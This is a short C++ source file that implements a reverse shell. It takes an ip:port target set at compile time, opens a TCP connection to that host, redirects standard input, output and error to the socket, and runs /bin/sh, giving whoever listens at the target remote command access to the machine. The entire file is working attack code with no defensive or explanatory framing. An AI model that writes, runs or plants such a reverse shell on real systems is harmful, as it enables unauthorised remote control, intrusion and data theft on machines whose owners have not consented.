#include <unistd.h> 
#include <sys/socket.h>
#include <iostream>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>

#ifndef TARGET
#error "TARGET not defined. Compile with -DTARGET="\"ip:port\""
#endif

const std::string target = TARGET;

int main (int argc, char* argv[]) {
    // 1. Parse the static target string
    auto pos = target.find(':');
    if (pos == std::string::npos) {
        std::cerr << "Invalid target format in TARGET macro\n";
        return 1;
    }

    std::string ip = target.substr(0, pos);
    int port = std::stoi(target.substr(pos + 1));

    // 2. Create the socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "Failed creating socket\n";
        return 1;
    }

    // 3. Set up address structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported\n";
        return 1;
    }

    // 4. Connect and redirect
    if (connect(sock, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        std::cerr << "Failed to establish a connection\n";
        return 1;
    }

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    char *const shell[] = {(char*)"/bin/sh", (char*)nullptr };
    execvp(shell[0], shell);
    
    std::cerr << "Failed to execute shell\n";
    return 1;
}